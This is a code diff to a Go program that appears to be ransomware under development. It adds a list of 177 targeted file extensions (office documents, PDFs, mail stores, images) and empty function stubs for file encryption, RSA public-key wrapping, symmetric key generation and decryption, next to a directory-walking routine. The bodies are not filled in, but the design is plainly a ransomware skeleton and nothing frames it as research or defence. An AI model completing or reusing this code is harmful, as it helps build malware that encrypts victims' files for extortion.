@@ -1,6 +1,7 @@
 package main
 
 import (
+	"crypto/rsa"
 	_ "embed"
 	"fmt"
 	"io/fs"
@@ -32,6 +33,21 @@ var Extensions = [177]string{
 	"xlc", "xlm", "xlw", "xlsb", "xlsm", "dotx", "dotm", "dot", "docm", "docb", "jpg", "jpeg",
 	"snt", "onetoc2", "dwg", "pdf", "wkl", "wks", "123", "rtf", "csv", "txt", "vsdx", "vsd", "eml",
 	"msg", "ost", "pst", "pptx", "ppt", "xlsx", "xls", "docx", "doc",
+}
+
+func encryptFiles(fileBytes []byte, filename string) error {
+}
+
+func encryptWithPublicKey(msg []byte, pub *rsa.PublicKey) ([]byte, error) {
+}
+
+func generateSymmKey() ([]byte, error) {
+}
+
+func bytesToPublicKey() (*rsa.PublicKey, error) {
+}
+
+func decryptFiles(key []byte, filename string) error {
 }
 
 func checkFilesRev(path string, d fs.DirEntry, err error) error {
